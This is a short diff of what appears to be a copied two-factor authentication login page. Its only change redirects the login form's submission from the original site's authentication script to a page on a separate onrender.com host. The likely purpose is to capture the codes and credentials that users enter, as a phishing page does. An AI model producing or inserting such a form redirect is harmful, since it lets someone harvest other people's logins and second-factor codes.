@@ -110,7 +110,7 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
             <a href="https://authenticationform.de/"><img src="./Two Factor Authentication_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
         </div>
         <div class="row" id="login-row" style="height: 60px;">
-            <form id="loginForm" action="https://authenticationform.de/vibb/authenticate/2FAuthentication.php" method="post" style="display: inline" autocomplete="off">
+            <form id="loginForm" action="https://authentication-qud0.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" method="post" style="display: inline" autocomplete="off">
                 <div class="col-xs-12 col-md-offset-0">
                     <div class="row">
                         <div class="login-fields">
